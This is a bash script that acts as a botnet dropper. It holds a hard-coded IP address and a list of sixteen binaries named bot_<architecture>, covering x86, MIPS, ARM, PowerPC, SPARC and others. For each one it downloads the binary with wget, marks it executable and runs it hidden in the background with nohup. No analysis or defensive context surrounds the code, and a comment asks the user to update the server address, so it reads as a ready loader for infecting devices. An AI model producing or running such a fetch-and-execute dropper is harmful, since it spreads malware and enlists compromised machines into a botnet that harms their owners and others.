#!/bin/bash

BASE_URL="http://185.194.177.247"  # <-- update this!
BOTS=(
  bot_i486
  bot_i586
  bot_i686
  bot_m68k
  bot_mips
  bot_mipsel
  bot_powerpc
  bot_powerpc-440fp
  bot_sh4
  bot_sparc
  bot_armv4l
  bot_armv5l
  bot_armv6l
  bot_armv7l
  bot_arc
  bot_x86_64
)

for bot in "${BOTS[@]}"; do
  echo "Downloading $bot ..."
  wget -q "$BASE_URL/$bot" -O "$bot"
  chmod +x "$bot"
  echo "Running $bot in background ..."
  nohup ./"$bot" > /dev/null 2>&1 &
done

echo "✅ All bots downloaded, chmodded, and launched."
